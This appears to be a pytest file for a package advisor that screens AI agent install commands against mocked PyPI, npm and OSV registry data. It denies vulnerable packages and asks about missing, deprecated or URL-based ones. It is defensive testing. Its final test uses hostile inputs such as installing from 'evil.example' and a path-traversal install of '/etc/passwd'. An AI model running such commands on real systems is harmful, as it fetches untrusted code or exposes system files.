"""The package advisor: structured registry data only, can only tighten, never talks to the real network here."""
from __future__ import annotations

import httpx
import pytest

from ev.agents.advisor import Advisor, packages
from ev.agents.rules import Verdict


def advisor(handler):
    return Advisor(httpx.Client(transport=httpx.MockTransport(handler)))


def test_package_names_are_read_from_install_commands():
    assert packages("pip install requests==2.31.0 flask") == [("PyPI", "requests", "2.31.0", ""), ("PyPI", "flask", "", "")]
    assert packages("npm i -D left-pad@1.3.0 @scope/pkg") == [("npm", "left-pad", "1.3.0", ""), ("npm", "@scope/pkg", "", "")]
    assert packages("pip install -r requirements.txt") == []
    assert packages("pip install git+https://x/y.git")[0][3] and packages("pip install ./local")[0][3]
    assert packages("git status") == [] and packages("pip install 'unclosed") == []


def test_a_known_vulnerability_is_refused_a_missing_package_is_asked_about():
    def pypi(req):
        if "evilpkg" in req.url.path:
            return httpx.Response(404)
        if "oldlib" in req.url.path:
            return httpx.Response(200, json={"info": {"version": "1.0", "classifiers": []}, "vulnerabilities": [{"id": "PYSEC-1"}]})
        return httpx.Response(200, json={"info": {"version": "2.0", "classifiers": []}, "vulnerabilities": []})

    a = advisor(pypi)
    d = a("Bash", {"command": "pip install oldlib==1.0"})
    assert d.verdict is Verdict.DENY and "PYSEC-1" in d.reason
    assert a("Bash", {"command": "pip install evilpkg"}).verdict is Verdict.ASK
    assert a("Bash", {"command": "pip install fine"}) is None
    assert a("Bash", {"command": "git status"}) is None and a("Read", {}) is None


def test_npm_uses_osv_and_deprecation():
    def h(req):
        if req.url.host == "api.osv.dev":
            return httpx.Response(200, json={"vulns": [{"id": "GHSA-x"}] if b"bad" in req.content else []})
        return httpx.Response(200, json={"version": "1.0.0", "deprecated": "use other" if "old" in req.url.path else ""})

    a = advisor(h)
    assert a("Bash", {"command": "npm install bad"}).verdict is Verdict.DENY
    assert a("Bash", {"command": "npm install old"}).verdict is Verdict.ASK
    assert a("Bash", {"command": "npm install good"}) is None


def test_a_registry_failure_asks_instead_of_allowing_and_results_are_cached():
    calls = []

    def h(req):
        calls.append(req.url.path)
        raise httpx.ConnectError("offline")

    a = advisor(h)
    assert a("Bash", {"command": "pip install x"}).verdict is Verdict.ASK
    a("Bash", {"command": "pip install x"})
    assert len(calls) == 1


@pytest.mark.parametrize("cmd", ["pip install ../../etc/passwd", "pip install a/b", "npm install https://evil.example/x.tgz"])
def test_paths_and_urls_are_never_sent_to_a_registry(cmd):
    def h(req):
        raise AssertionError("must not call out")

    assert advisor(h)("Bash", {"command": cmd}).verdict is Verdict.ASK
